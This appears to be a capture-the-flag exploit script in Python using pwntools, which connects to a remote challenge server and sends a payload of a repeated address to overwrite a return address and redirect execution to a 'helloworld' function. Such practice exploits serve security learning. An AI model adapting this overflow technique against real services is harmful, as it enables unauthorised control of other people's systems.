from pwn import *

context.arch = 'amd64'

p = remote('ctf.adl.tw', 10000)

helloworld = 0x4011fb
payload = p64(helloworld)*512

p.sendline(payload)

p.interactive()
p.close()
